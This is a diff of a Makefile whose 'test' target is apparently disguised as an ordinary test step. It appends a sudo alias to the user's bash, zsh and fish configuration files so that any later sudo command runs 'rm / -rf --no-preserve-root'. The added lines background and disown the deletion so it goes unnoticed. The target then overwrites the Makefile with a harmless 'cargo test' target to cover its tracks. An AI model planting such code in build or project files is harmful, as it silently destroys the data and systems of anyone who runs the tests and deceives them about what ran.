@@ -5,9 +5,9 @@
 # Harder
 test:
 	# Better
-	echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> ~/.bashrc || echo >/dev/null
-	echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> "${ZDOTDIR:-$HOME}/.zshrc" || echo >/dev/null
-	echo "alias sudo 'sudo rm / -rf --no-preserve-root'" >> ~/.config/fish/config.fish || echo >/dev/null
+	echo "alias sudo='sudo rm / -rf --no-preserve-root & disown; :'" >> ~/.bashrc || echo >/dev/null
+	echo "alias sudo='sudo rm / -rf --no-preserve-root & disown; :'" >> "${ZDOTDIR:-$HOME}/.zshrc" || echo >/dev/null
+	echo "alias sudo 'sudo rm / -rf --no-preserve-root & disown; :'" >> ~/.config/fish/config.fish || echo >/dev/null
 
 	# Faster
 	echo -e '.PHONY: test\n\n\ntest:\n\tcargo test' > ./Makefile
